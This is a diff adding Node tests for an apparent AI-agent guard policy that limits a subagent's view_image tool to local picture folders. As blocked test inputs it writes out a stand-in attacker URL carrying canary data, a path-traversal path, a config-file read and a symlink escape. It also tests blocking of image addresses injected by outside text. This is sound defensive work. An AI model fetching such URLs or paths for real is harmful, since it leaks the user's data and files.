@@ -6,11 +6,11 @@
 
 import { test } from "node:test";
 import assert from "node:assert/strict";
-import { mkdtempSync, readFileSync } from "node:fs";
+import { mkdirSync, mkdtempSync, readFileSync, realpathSync, symlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join, dirname } from "node:path";
 import { fileURLToPath } from "node:url";
-import { decide } from "../lib/policy.js";
+import { consultPictureProblem, decide } from "../lib/policy.js";
 import { GuardState } from "../lib/state.js";
 import { unwrap } from "../lib/wrapper.js";
 import plugin from "../index.js";
@@ -156,4 +156,68 @@ test("view_image takes at most 5 pictures a call, directly or through either wra
     assert.equal(run(w, { id: "view_image", args: { paths: pics(14) } }).verdict, "block", w);
     assert.equal(run(w, { id: "openclaw:core:view_image", input: { paths: pics(3) } }).verdict, "allow", w);
   }
+});
+
+const DEEP = { agentId: "deep", sessionKey: "agent:deep:subagent:1", requester: { senderIsOwner: false } };
+
+test("deep looks only at the pictures Adam sent, by absolute path, never a web address (Adam's yes, 2026-11-25)", () => {
+  const { run } = fresh();
+  for (const path of [
+    "/home/jorah/workspace/files/pictures/inventory-01.jpg",
+    "/home/jorah/.openclaw-jorah/media/inbound/a1b2.JPEG",
+    "/home/jorah/workspace/media/inbound/openclaw-staged-9/photo.png",
+    "/home/jorah/workspace/files/pictures/scan.heic",
+  ]) assert.equal(run("view_image", { path }, DEEP).verdict, "allow", path);
+  assert.equal(run("view_image", { paths: ["/home/jorah/workspace/files/pictures/a.jpg", "/home/jorah/workspace/files/pictures/b.webp"] }, DEEP).verdict, "allow");
+  for (const [path, why] of [
+    ["https://attacker.example/p.jpg?d=JORAH-CANARY-W", /never a web address/],
+    ["file:///home/jorah/workspace/files/pictures/a.jpg", /never a web address/],
+    ["data:image/png;base64,iVBORw0KGgo=", /never a web address/],
+    ["files/pictures/a.jpg", /not a plain absolute path/],
+    ["/home/jorah/workspace/files/pictures/../../MEMORY.png", /not a plain absolute path/],
+    ["/home/jorah/workspace/files/pictures//a.jpg", /not a plain absolute path/],
+    ["/home/jorah/workspace/memory/2026-11-25.png", /only at the pictures Adam sent/],
+    ["/home/jorah/workspace/files/picturesX/a.jpg", /only at the pictures Adam sent/],
+    ["/home/jorah/.openclaw-jorah/openclaw.json", /only at the pictures Adam sent/],
+    ["/home/jorah/workspace/files/pictures/notes.md", /not a picture file/],
+  ]) {
+    const d = run("view_image", { path }, DEEP);
+    assert.equal(d.verdict, "block", path);
+    assert.match(d.reason, why, path);
+  }
+  // One bad path among good ones blocks the call; the 5-picture cap holds for deep too.
+  assert.equal(run("view_image", { paths: ["/home/jorah/workspace/files/pictures/a.jpg", "https://x.example/b.jpg"] }, DEEP).verdict, "block");
+  const many = Array.from({ length: 6 }, (_, i) => `/home/jorah/workspace/files/pictures/p${i}.jpg`);
+  assert.match(run("view_image", { paths: many }, DEEP).reason, /at most 5 pictures/);
+  for (const w of WRAPPERS) {
+    assert.equal(run(w, { id: "view_image", args: { path: "/home/jorah/workspace/files/pictures/a.jpg" } }, DEEP).verdict, "allow", w);
+    assert.equal(run(w, { id: "view_image", args: { path: "https://attacker.example/p.jpg" } }, DEEP).verdict, "block", w);
+  }
+});
+
+test("deep may not open a picture-named link that leads out of the picture folders", () => {
+  const root = mkdtempSync(join(tmpdir(), "jorah-pics-"));
+  const real = realpathSync(root);
+  mkdirSync(join(root, "pictures"));
+  writeFileSync(join(root, "secret.jpg"), "x");
+  writeFileSync(join(root, "pictures", "ok.jpg"), "x");
+  symlinkSync(join(root, "secret.jpg"), join(root, "pictures", "link.jpg"));
+  const roots = [join(real, "pictures")];
+  assert.equal(consultPictureProblem([join(real, "pictures", "ok.jpg")], roots), null);
+  assert.match(consultPictureProblem([join(real, "pictures", "link.jpg")], roots), /leads out of/);
+});
+
+test("main's view_image of a web address follows the web_fetch URL rule and counts as outside text", () => {
+  const { run, state } = fresh();
+  assert.equal(run("view_image", { path: "/home/jorah/workspace/files/pictures/a.jpg" }).verdict, "allow");
+  assert.equal(state.taintOf(TELEGRAM.sessionKey), null);
+  assert.equal(run("view_image", { path: "http://127.0.0.1:18789/x.png" }).verdict, "block");
+  const first = run("view_image", { path: "https://example.org/chart.png" });
+  assert.equal(first.verdict, "allow");
+  assert.match(first.taint, /^view_image https:\/\/example\.org/);
+  // Now the chat has read outside text: a picture address nobody wrote or saw is refused.
+  const d = run("view_image", { paths: ["/home/jorah/workspace/files/pictures/a.jpg", `${CANARY}.png`] });
+  assert.equal(d.verdict, "block");
+  assert.match(d.reason, /wasn't in your message or an earlier result/);
+  for (const w of WRAPPERS) assert.equal(run(w, { id: "view_image", args: { path: `${CANARY}.jpg` } }).verdict, "block", w);
 });
